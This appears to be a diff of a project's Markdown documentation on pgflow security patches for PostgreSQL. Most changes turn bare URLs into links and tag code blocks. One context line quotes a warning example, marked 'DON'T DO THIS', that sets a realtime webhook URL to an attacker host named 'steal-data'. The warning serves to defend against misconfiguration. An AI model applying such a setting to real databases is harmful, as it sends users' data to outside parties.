@@ -251,8 +251,8 @@ SET realtime.webhook_url = 'https://attacker.com/steal-data';  -- DON'T DO THIS
 
 These are **local patches** for compatibility and security. They are tracked internally but not official CVE entries.
 
-**Status**: Pending upstream review  
-**Issue**: To be filed at https://github.com/pgflow-dev/pgflow/issues
+**Status**: Pending upstream review
+**Issue**: To be filed at [pgflow-dev/pgflow/issues](https://github.com/pgflow-dev/pgflow/issues)
 
 When upstream publishes fixes, we can:
 
@@ -314,7 +314,7 @@ bun run scripts/test/test-pgflow-new-database.ts
 
 **Symptoms**:
 
-```
+```text
 ERROR:  function realtime.send() does not exist
 ```
 
@@ -351,7 +351,7 @@ If not set, run `00-aza-pg-settings.sh` manually.
 
 **Symptoms**:
 
-```
+```text
 ERROR:  permission denied for function send
 ```
 
@@ -402,16 +402,15 @@ GRANT EXECUTE ON FUNCTION realtime.send(jsonb, text, text, boolean) TO my_app_ro
 
 ## References
 
-- pgflow Documentation: https://github.com/pgflow-dev/pgflow
-- Supabase Realtime: https://supabase.com/docs/guides/realtime
-- PostgreSQL LISTEN/NOTIFY: https://www.postgresql.org/docs/current/sql-notify.html
-- pgmq Extension: https://github.com/tembo-io/pgmq
-- pg_net Extension: https://github.com/supabase/pg_net
+- [pgflow Documentation](https://github.com/pgflow-dev/pgflow)
+- [Supabase Realtime](https://supabase.com/docs/guides/realtime)
+- [PostgreSQL LISTEN/NOTIFY](https://www.postgresql.org/docs/current/sql-notify.html)
+- [pgmq Extension](https://github.com/tembo-io/pgmq)
+- [pg_net Extension](https://github.com/supabase/pg_net)
 
 ## Contributing
 
-Found a bug or have a suggestion? Please file an issue at:
-https://github.com/fluxo-kt/aza-pg/issues
+Found a bug or have a suggestion? Please file an issue at: [aza-pg/issues](https://github.com/fluxo-kt/aza-pg/issues)
 
 When reporting pgflow issues, include:
 
